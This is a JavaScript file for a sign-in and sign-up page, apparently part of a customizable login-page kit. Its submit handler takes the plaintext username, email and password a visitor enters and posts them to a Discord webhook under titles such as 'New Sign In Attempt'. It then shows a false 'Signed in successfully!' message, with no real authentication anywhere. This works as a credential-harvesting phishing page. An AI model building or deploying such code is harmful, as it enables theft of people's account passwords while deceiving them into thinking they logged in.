// Tab switching
function switchTab(tabIndex) {
    const signinForm = document.getElementById('signin-form');
    const signupForm = document.getElementById('signup-form');
    const signinTab = document.getElementById('signin-tab');
    const signupTab = document.getElementById('signup-tab');

    if (tabIndex === 0) {
        signinForm.classList.add('active');
        signupForm.classList.remove('active');
        signinTab.classList.add('active');
        signupTab.classList.remove('active');
    } else {
        signinForm.classList.remove('active');
        signupForm.classList.add('active');
        signinTab.classList.remove('active');
        signupTab.classList.add('active');
    }
}

// Handle form submission
async function handleSubmit(e, type) {
    e.preventDefault();
    
    let data = {};
    let embedTitle = '';
    
    if (type === 'signin') {
        data = {
            emailOrUsername: document.getElementById('signin-email').value,
            password: document.getElementById('signin-password').value,
            type: 'signin'
        };
        embedTitle = '🔑 New Sign In Attempt';
    } else {
        const password = document.getElementById('signup-password').value;
        const confirm = document.getElementById('signup-confirm').value;
        
        if (password !== confirm) {
            alert("Passwords don't match!");
            return;
        }
        
        data = {
            username: document.getElementById('signup-username').value,
            email: document.getElementById('signup-email').value,
            password: password,
            type: 'signup'
        };
        embedTitle = '📝 New Account Creation';
    }

    // === DISCORD WEBHOOK ===
    // Replace this with your own Discord webhook URL
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
    
    if (WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
        console.log('⚠️ Please replace the WEBHOOK_URL with your real Discord webhook!');
        alert('Demo mode: Form data logged to console. Set up your Discord webhook to receive real notifications.');
    } else {
        try {
            const payload = {
                embeds: [{
                    title: embedTitle,
                    color: 0x6366f1,
                    fields: Object.entries(data).map(([key, value]) => ({
                        name: key.charAt(0).toUpperCase() + key.slice(1),
                        value: value || 'N/A',
                        inline: true
                    })),
                    timestamp: new Date().toISOString()
                }]
            };
            
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            console.log('✅ Data sent to Discord webhook');
        } catch (error) {
            console.error('Failed to send to webhook:', error);
        }
    }

    // Success feedback
    const message = type === 'signin' ? 'Signed in successfully!' : 'Account created successfully!';
    alert(message + '\n\nDetails sent to your Discord server (if webhook configured).');
    
    // Reset form
    e.target.reset();
}

// Make elements easily customizable
console.log('%c✅ Login page ready! Edit styles.css for colors, index.html for text/structure. Replace WEBHOOK_URL in script.js for Discord notifications.', 'color: #6366f1; font-size: 14px;');
